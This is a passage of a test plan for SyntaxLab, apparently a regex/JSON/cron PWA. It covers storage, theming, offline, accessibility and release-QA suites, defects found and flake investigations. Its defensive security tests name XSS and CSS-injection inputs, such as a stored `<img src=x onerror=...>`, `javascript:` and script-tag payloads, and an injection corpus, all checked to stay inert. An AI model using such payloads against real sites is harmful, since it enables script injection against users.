  property:     # fast-check, 100k cases, fixed + rotating seed
  security:     # security suite + npm audit --audit-level=high
  build:        # production build + bundle budget check
  e2e:          # playwright (chromium full, firefox/webkit critical)
  a11y:         # axe on all views  (gate: 0 critical/serious)
  lighthouse:   # gates: 95/95/95/90 + PWA
```

**All jobs must pass to merge.** No exceptions, no "fix it in the next PR".

---

## 12. Manual test checklist (pre-release)

```
[ ] Fresh install, no cached data — first-run experience is coherent
[ ] Every shipped mode with real-world inputs
[ ] Offline after first load — every feature
[ ] Install as a PWA on desktop and Android; launch standalone
[ ] Update flow in an installed PWA
[ ] Screen-reader pass on the primary journey
[ ] Keyboard-only pass
[ ] 200% zoom
[ ] Mobile device, real hardware
[ ] Theme customisation including a deliberately terrible colour choice
[ ] History with 500 entries — performance and pruning
[ ] Import a hostile file by hand
[ ] Devtools: inspect everything written to storage; confirm no surprises
[ ] Network tab: confirm zero requests after load
[ ] Security header review on the deployed preview
```

---

## 13. What testing will not catch

Stated so nobody mistakes a green pipeline for correctness:

- **Explanation quality.** Tests assert the explanation *matches the golden file*. Whether it is *good* is a human judgement, reviewed on every golden-file change.
- **Design and feel.** No test knows the UI looks cheap.
- **Cron semantics vs a specific scheduler.** We test our documented dialect, not parity with any particular implementation — and we say so in the UI. See §3.3.1 for why no cron oracle is used at all.
- **Novel browser bugs.** Especially in service workers and IndexedDB.
- **Supply-chain compromise.** `npm audit` finds known issues, not new ones.
- **Whether the product is useful.** That needs users.

---

## 13.1 Refusal is specified behaviour, and is tested as such

Where SyntaxLab deliberately does not support something, the correct behaviour is a **clear refusal with a useful message** — not a best-effort attempt. That is a feature with acceptance criteria, so it has tests:

| Deliberate non-support | Refusal test | Criterion |
|---|---|---|
| Non-ECMAScript regex constructs | Each row of the dialect table produces its specific corrective hint | R-18, R-19 |
| Non-5-field cron *(V1.1)* | Each unsupported dialect produces a message naming the scheduler it comes from | C-7 to C-11 |
| JSON5 / JSONC syntax | Trailing commas, comments, single quotes each produce a dialect-aware hint | J-20 |
| Named timezones *(V1.1)* | No named-zone UI exists; the standing scope note is present | C-6, C-23 |
| Oversized input | Rejected before parsing, with the actual size shown | S-7 |

A refusal that is vague ("invalid input") fails these tests just as surely as a wrong parse would.


---

## 14. M7 — history

### What runs where, and why

happy-dom provides no IndexedDB. Rather than add a fake-IDB dependency, the
split is:

| Layer | Where | What it proves |
|---|---|---|
| Domain — validate, query, title, transfer | Unit | Every rule about what a record may be |
| Repository — dedupe, pruning, quota, degradation | Unit, against a **controllable backend** | The *policy*, including every failure a real database can produce on demand |
| IndexedDB wiring | **E2E, real browsers** | That the policy is actually reaching disk |
| Presentation | Unit, pure functions | The wording |

The controllable backend (`tests/unit/history/fakeBackend.ts`) can be told to
throw a `QuotaExceededError` once, or on every write. That is the only
practical way to test "storage filled up" — you cannot reliably fill a real
browser's quota in a test, and a test that tried would be slow and flaky.

**Both backends share one implementation of the rules.** The memory fallback is
the same `HistoryStore` over a different backend, so the path that gets the
least manual testing behaves identically to the one that gets the most.

### The E2E suite — 22 tests × 3 browsers

Real IndexedDB, production build, real CSP. Beyond the happy path:

| Test | What would otherwise go unnoticed |
|---|---|
| Survives a reload | That this is storage, not session state |
| A stored `<img src=x onerror=...>` renders as text | That nothing in the round trip through disk builds markup |
| A corrupt record planted directly in the database | That one bad record does not take the list down, and is set aside rather than deleted |
| A record with `schemaVersion: 99` and `type: 'cron'` | That an old build does not destroy a newer build's data — the record is read back **off disk** to prove it survived |
| `indexedDB` removed before any app code runs | That regex and JSON still work, and that the UI says history is not being saved |
| Two tabs | That a save in one reaches the other, and pausing in one pauses the other |
| Focus after 12 Tab presses | That the modal actually traps focus |

### Defects the tests found

| Found by | Defect |
|---|---|
| Unit | `schemaVersion: 1.5` was classified as data from a newer build — kept and hidden — when it is corruption. The future check now requires an integer. |
| E2E | The history button's accessible name collided with the pause toggle's. The pause label now leads with its verb. |
| E2E | An entry row's accessible name was the entire row read as one sentence. Rows now carry explicit labels. |
| **Reading the spec against the build** | Four drifts: a missing compound index, a `meta` record shaped for its caller rather than the store, an explicit Analyze that still waited two seconds, and quota exhaustion that retried a failing write after every analysis for the rest of the session. |

### The M6 flake, closed

The unreproduced `workers-firefox` failure recorded at M6 was investigated at
M7 before any other work: five consecutive full-suite runs under full parallel
load. It never recurred. Three other single failures appeared across those
runs, no two the same test, spread over four browser projects — including one
test that failed on two different engines.

**Judged an environment flake, and no retry or timeout increase was added.**
Every affected test has a wall-clock dependency and eleven browser projects
share one machine. Adding retries would hide the signal: if these ever
concentrate on one test, that is a real defect and it should stay visible.

One of the three recurred during the final M7 run. It was checked against M7
specifically — the milestone adds a banner directly above the element that
test looks at — and ruled out: the same test failed on a build that contained
no history code, and three isolated repeats pass with the banner present.

Full evidence in `IMPLEMENTATION_STATUS.md`, M7.

### What is deliberately not tested

- **A real `QuotaExceededError` from a real browser.** Filling a browser's quota takes minutes and the threshold varies by machine. The error is injected instead, and the code path from the error to the UI is fully covered.
- **Eviction under storage pressure.** Not triggerable on demand. It is disclosed in the UI copy instead, and that copy is asserted.


---

## 15. M8 — theme

### The split

| Layer | Where | What it proves |
|---|---|---|
| Validation, presets, contrast maths | Unit (43) | Every rule about what a theme value may be |
| Store, application, persistence | Unit (21) | That a change reaches CSS, and only validated values do |
| The whole feature | E2E, 3 engines (40 each) | The validator wired to a real `setProperty` under the real CSP |

### The security corpus

Eighteen payloads are planted in `localStorage` and the page reloaded, each
asserting: only `#RRGGBB` reached the three colour properties, the angle is
still an integer with a unit, the intensity is still a number, no dialog
opened, no page error was thrown, no `img[src]` or inline `<script>` exists,
and the application still works.

```
CSS injection through a colour · url() · expression() · HTML fragment
style-tag escape · oversized hex · custom-property escape · null numerics
out-of-range intensity · hostile angle string · unknown preset
hostile contrast enum · future schemaVersion · malformed schemaVersion
array · bare string · unparseable JSON · empty string
```

Plus: a payload combining `javascript:`, an `onerror` image and a script tag,
asserted to open no dialog and throw no error; and a mixed record proving one
corrupt field costs only that field.

### Accessibility

axe (`wcag2a`, `wcag2aa`, `wcag21a`, `wcag21aa`) over: the drawer open, the
whole interface in **high-contrast mode**, the drawer in high-contrast mode,
and a **custom theme with the analysis panes populated**. Plus keyboard
operation of every control, focus trapping, Escape, and focus restoration.

### Two measurement notes, so the numbers are not overread

**Forced colors.** *(Corrected at M10 — the paragraph that stood here was
wrong, and the correction changed what could be tested.)*

What M8 and M9 recorded: that `forcedColors: 'active'` only flips the media
query, so axe was measuring a mode the browser had not entered.

What is actually true, measured at M10: **the browser does apply a real forced
palette.** `document.body` computes to the system foreground on the system
background, and background *images* are dropped. What is unreliable is
**axe's own `color-contrast` rule**, which reads authored colours rather than
computed ones and therefore reports our dark palette against a forced light
background. The 29 nodes were axe misreading, not the emulation failing.

The consequence is that forced colors *can* be validated here, and M10 does —
by reading `getComputedStyle` rather than asking axe. See §17.

Two further measurements worth keeping:

- `test.use({ forcedColors })` inside a `describe` block **does not reach the
  page**; both media queries read false. `page.emulateMedia()` does.
- Chromium's forced palette is light and Firefox's is dark, so an assertion
  naming a specific colour can only ever pass on one engine. The checks assert
  that our authored background is gone and that what replaced it carries high
  contrast.

**Focus restoration.** WebKit on macOS does not focus a `<button>` when it is
clicked, so a mouse-opened dialog has no opener to return to on that engine.
The test opens from the keyboard, which is who focus restoration is for; all
three engines then restore correctly with no code of ours involved. An earlier
attempt to "fix" this in the `Dialog` primitive was reverted once measurement
showed the platform already did it.

### Defects these tests found

| Found by | Defect |
|---|---|
| Unit | `matchesPreset` looked up the preset the theme *claimed*, so a theme could never name a preset again after one custom edit. |
| Unit | Two store tests spied on `Storage.prototype`, which happy-dom does not route these writes through — the debounce test measured nothing and the storage-refusal test never entered its catch. |
| Audit | `setTheme` trusted its callers; `applyTheme` is a `setProperty` sink. Now revalidated at the choke point. |
| Audit | `SURFACE_HEX` was `#0d1117`; `--color-surface` is `#101613`. The contrast guard was reporting confident ratios against a background the accent is never shown on. A test now reads the value out of `tokens.css`. |
| Spec review | The contrast guard was silent when a colour passed, where §4.5 specifies "✓ Passes AA". |
| Visual review | "Amber Console" was ellipsised to "Amber Consol…". |


---

## 16. M9 — offline and the service worker

### Where these tests run, and why it is different

Every other E2E project hits `vite preview`, which serves **no headers**. A
service worker takes its CSP from the headers on its own script, so a policy
that breaks the worker is invisible to a suite served without them — and
measurably was: under the real `_headers`, the worker never activated and
cached nothing.

`scripts/serve-production.mjs` serves `dist/` with the real `public/_headers`.
The four `offline-*` projects run against it on port 4183.

One directive is dropped locally: `upgrade-insecure-requests`. On an HTTPS
origin it is a no-op belt-and-braces measure; over `http://localhost` it makes
WebKit rewrite every subresource URL to `https://localhost`, which nothing is
listening on, and the page fails to load. Chromium and Firefox exempt
localhost; WebKit does not. Every directive that governs the service worker is
served exactly as production serves it.

### Offline is real

`context.setOffline(true)`. Nothing fakes `navigator.onLine` or asserts on a
banner. With the network cut and the page reloaded, the suite runs a regex
analysis, a regex execution, a JSON analysis, a format, history read/write/
delete, a pre-paint theme check, and a mode switch. If a worker chunk were
missing from the precache, these fail the way a user would experience it.

### Isolation

Every test builds its own `BrowserContext`, so no service worker, cache,
IndexedDB or localStorage crosses between them — a cached build left by a
previous test would make an offline assertion pass for the wrong reason.

The update suite is isolated further: its own port, and its own copy of the
build under `.tmp/update-dist`. It has to rewrite the bytes the server hands
out, and `dist/` is shared with every other project — mutating it mid-run
would make an update banner appear in the middle of a history or theme test.

### Defects these tests found

| Found by | Defect |
|---|---|
| **A/B under production headers** | `connect-src 'none'` applied to `/sw.js` stopped the worker activating and caching anything, silently. Nothing in the existing suite could have caught it. |
| The missing-API test | `'serviceWorker' in navigator` is true when the property exists and is `undefined`, which is how a locked-down profile presents it. Reading through that guard threw **before first render** — a blank page over a feature the app does not need. |
| Firefox | The helper picked the precache by `keys()[0]`; a test that plants an unrelated cache made it pick the wrong one. Browsers do not agree on that order. |

### Known gaps, stated rather than papered over

**WebKit offline is not verified by automation.** Playwright 1.62.1 cannot
navigate WebKit under `setOffline` — both `reload()` and `goto()` fail with an
internal error, **and fail identically with no service worker registered**. Six
tests skip there with that measurement as the reason; seven still run. Real
Safari offline behaviour is a manual pre-release check.

**The update flow is Chromium-only**, for the isolation reason above.

**`regex-mobile › survives two timeouts in a row` fails in isolation.** This
predates M9: it fails identically at the M8 commit `a13910e`, with the PWA
plugin disabled, and passes on `regex-chromium`. It is device-emulation
specific and is an open issue against the M4 execution-timeout tests, not an
M9 regression. Recorded rather than left for someone to rediscover.

---

## 17. M10 — hardening

### What was added

| Suite | Tests | Covers |
|---|---|---|
| `tests/unit/theme/contrast.test.ts` | 18 | Every preset's accent against the real surface, the fixed tokens read out of `tokens.css`, and which presets needed a lightened companion |
| `tests/e2e/hardening.spec.ts` | 17 × 3 projects | Forced colors on computed values, hostile input through every editor and store, keyboard-only operation, reduced motion |
| `tests/e2e/a11y-tree.spec.ts` | 8 | Accessible names for every control, landmarks, exposed state, live regions |

### Forced colors, properly

Asserted on `getComputedStyle`, not on axe — see the correction in §16. The
assertions are engine-neutral because Chromium's forced palette is light and
Firefox's is dark: what is checked is that our authored background is gone and
that what replaced it carries the contrast the OS guarantees.

**Found and fixed:** an unselected mode tab had no border under forced colors
and read as plain text rather than a control.

### Screen readers — NOT RUN

No screen reader is available in this environment. NVDA and JAWS are not
installed; Narrator exists but cannot be driven or heard from a
non-interactive shell. **§7's manual screen-reader pass has not been
performed** and is a release gate.

What stands in its place is the accessibility-*tree* audit above, which checks
the data a screen reader consumes. It cannot say how a screen reader phrases
something. It can say that a control has no name, which is the defect class
that ships.

### The known mobile regex failure, classified

`regex-mobile › survives two timeouts in a row` still fails, repeatably, in
isolation — 3 runs out of 3 at M10.

| Question | Evidence |
|---|---|
| Is it M10's? | No. It failed identically at the M8 commit `a13910e` and with the PWA plugin disabled at M9. |
| Is it the product? | The architecture invariant is green: **18** worker timeout/terminate/respawn tests pass across Chromium, Firefox and WebKit. `regex-chromium` passes the same test. |
| What is it, then? | A hard-coded **15 s assertion budget inside the test**, on an emulated Pixel 5, after two deliberate 2 s timeouts. Raising `--timeout` changes nothing, because the inner `toBeVisible({ timeout: 15_000 })` is what expires. |
| Fixed at M10? | No, and deliberately not papered over with a retry. It is an open issue against the M4 execution-timeout tests. |

### Full matrix at M10

**601 passed, 9 skipped, 1 failed** across 26 projects. The single failure was
`json › suggestion can be dismissed`, which passes in isolation and is the
scattered environment flake characterised at M7 — a different test each run,
never the same one twice.

---

## M11 — performance and refinement suites

Three new Playwright projects, plus two tests folded into the existing regex
spec. All of them exist because M11 changed something that could break
silently.

| Project | Spec | What it pins |
|---|---|---|
| `editor-chromium`, `editor-firefox` | `editor-keys.spec.ts` | The keymap is rebuilt locally rather than imported (`12_PERFORMANCE.md` §12.2), so the bindings a developer would notice losing are asserted: indent-preserving Enter, Backspace/arrows/Home/End, Mod-a with undo and redo, and Tab still leaving the editor instead of becoming a keyboard trap. |
| `splitter-chromium`, `splitter-firefox` | `splitter.spec.ts` | Drag, clamping under a drag far past the viewport edge, full keyboard operation, persistence across reload and mode switch, absence when the layout stacks, a hostile stored value, and axe. |
| — | `regex.spec.ts` (+2) | The match window holds at 200 while the count still reports 4 000, "Show more" grows it, and a new pattern resets it. |

Both new specs use `keyboard.insertText` rather than the clipboard for bulk
input: it dispatches one input event instead of thousands of key events, and it
needs no clipboard permission, which differs across the three engines.

### Measurement scripts

Not tests — they produce numbers, and are run deliberately rather than in CI.

| Script | |
|---|---|
| `scripts/measure-m11.mjs` | The M11 baseline: startup cold/warm/offline, regex analysis across five pattern shapes, regex execution, JSON at three sizes, tree expand, format, history open, theme switch. |
| `scripts/analyze-bundle.mjs` | Reads the treemap `rollup-plugin-visualizer` embeds and prints gzipped bytes per npm package or app directory. |

### Measured, not changed

M11 also looked hard at three things and left them alone, which is recorded so
a later milestone does not repeat the work: large-JSON interaction
(`12_PERFORMANCE.md` §12.5), React commit counts (§12.6), and the visual effect
inventory (§12.7).

---

## M12 — the release-QA suites

Two new specs, six new projects, and the end of the flake era.

| Project | Spec | What it proves |
|---|---|---|
| `release-chromium/firefox/webkit/mobile` | `release-qa.spec.ts` | The four complete user journeys — regex, JSON, history, theme — against the production build under production `_headers`, watching `securitypolicyviolation` events, console CSP messages and page errors for the life of each journey and asserting them clean at every step boundary |
| `gates-chromium` | `release-gates.spec.ts` | Served headers compared against `public/_headers` directive by directive; installability, with each icon's real dimensions read from its PNG IHDR; 1 000 history entries listed and searched |

Both run against **:4183**, which parses the real `_headers`. A release gate
that validates a policy the app does not ship with is not a release gate.

### The flakes had causes

The suite carried a "scattered environment flake" from M7 to M11 — a different
test failing each full-matrix run, always passing in isolation. M12 stopped
classifying it and found it. There were four:

| | Cause | Fix |
|---|---|---|
| `regex-mobile › survives two timeouts` | `locator.fill()` **appends** rather than replaces on a CodeMirror contenteditable under mobile emulation | The `type()` helpers in `regex.spec.ts` and `json.spec.ts` select all and insert |
| `json-mobile › the suggestion can be dismissed` | Three buttons named exactly "Dismiss"; a second appeared when the service worker installed mid-test | Fixed **in the product** — each button says what it dismisses |
| `history-webkit › a record from a newer version` | Opening IndexedDB while the app's own open was in flight settles no event at all on WebKit | The test lets the repository load first |
| `theme-webkit › a valid field survives` | Read a custom property at one instant during the pre-paint → hydration handover | Polls for the settled value; the expectation is unchanged |

**No test is retried, quarantined, or loosened.** The full matrix ran
674 passed / 0 failed / 11 skipped twice consecutively.

**One flake remains and is a different category.** The three `workers`
projects are the only ones driving the **Vite development server**, because the
real worker harness needs a global that production compiles out. Under the
eight-way parallel matrix that single dev server is a shared bottleneck, and
the wait for the harness global occasionally overruns. The same test passes 3/3
in isolation and the project passes 22/22 alone. It cannot affect the shipped
artefact, because the dev server is not the shipped artefact — and it is not
being fixed with a retry or a longer timeout, either of which would hide it.
Closing it means warming the module graph before the matrix, or running those
three projects serially.

### The 11 skips

All WebKit, all skipped in code with a reason: six offline tests and two
journey tails because Playwright cannot navigate WebKit while the context is
offline, and three timeout tests because JavaScriptCore optimises the
catastrophic patterns and cannot be made to time out by one.

### A lesson worth keeping

Four assertions in the new journeys were wrong before the product was: the
invalid-pattern wording, the two-second history capture delay, `:focus-visible`
versus programmatic focus, and assuming `(a+)+$` times out on every engine. In
each case the app was behaving correctly and better than the test expected. A
failing assertion is a hypothesis about the product, not a verdict on it.
